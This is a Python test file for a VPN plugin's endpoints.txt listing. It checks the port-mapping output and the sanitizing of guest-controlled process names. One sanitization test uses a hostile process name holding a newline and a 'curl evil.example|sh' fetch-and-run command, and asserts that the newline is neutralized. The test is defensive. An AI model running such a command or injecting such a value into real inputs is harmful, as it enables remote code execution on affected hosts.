"""Host-side tests for the VPN plugin's endpoints listing (endpoints.txt).

The VPN plugin's __init__ launches host-side processes (vpn/vsock bridges), so
it isn't null-backend-loadable via penguin.testing.load_pyplugin. endpoints.txt
is produced by a pure, side-effect-free helper, so we exercise that directly on
an instance built with __new__ (no __init__), setting only the attributes it
reads. The in-guest path is covered by the tests/integration test_target
netbinds.yaml verifier conditions.
"""
import importlib.util
import sys
import types
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
VPN = REPO_ROOT / "pyplugins" / "actuation" / "vpn.py"


def _load_vpn_module(name):
    # vpn.py imports `jc` (not a test dependency) at module scope but the
    # endpoints helper never touches it; stub it so the import succeeds off-guest.
    sys.modules.setdefault("jc", types.ModuleType("jc"))
    spec = importlib.util.spec_from_file_location(name, str(VPN))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _vpn(mod, tmp_path, bridges):
    vpn = mod.VPN.__new__(mod.VPN)
    vpn.outdir = str(tmp_path)
    vpn.exposed_ip = "192.168.100.2"
    vpn.bridges_made = bridges
    return vpn


def test_endpoints_listing(tmp_path):
    mod = _load_vpn_module("vpn_plugin_endpoints")
    vpn = _vpn(mod, tmp_path, {
        ("tcp", "0.0.0.0", 23): {"procname": "telnetd", "ipvn": 4, "host_port": 2323},
        ("tcp", "[::]", 80): {"procname": "httpd", "ipvn": 6, "host_port": 8080},
        ("udp", "0.0.0.0", 53): {"procname": "dnsmasq", "ipvn": 4, "host_port": 53},
    })
    vpn._write_endpoints()

    endpoints = (tmp_path / "endpoints.txt").read_text()
    assert "tcp 192.168.100.2:2323 -> 0.0.0.0:23 (telnetd)\n" in endpoints
    assert "tcp 192.168.100.2:8080 -> [::]:80 (httpd)\n" in endpoints
    assert "udp 192.168.100.2:53 -> 0.0.0.0:53 (dnsmasq)\n" in endpoints


def test_endpoints_sanitizes_guest_procname(tmp_path):
    """A guest can set its comm to include newlines/control chars (prctl
    PR_SET_NAME); those must be neutralized in the generated listing."""
    mod = _load_vpn_module("vpn_plugin_endpoints_sanitize")
    evil = "x\ncurl evil.example|sh #"
    vpn = _vpn(mod, tmp_path, {
        ("tcp", "0.0.0.0", 8080): {"procname": evil, "ipvn": 4, "host_port": 8080},
    })
    vpn._write_endpoints()

    endpoints = (tmp_path / "endpoints.txt").read_text()
    # One line, newline neutralized to '?'.
    assert endpoints == "tcp 192.168.100.2:8080 -> 0.0.0.0:8080 (x?curl evil.example|sh #)\n"
    assert mod._sanitize_label("tab\there") == "tab?here"
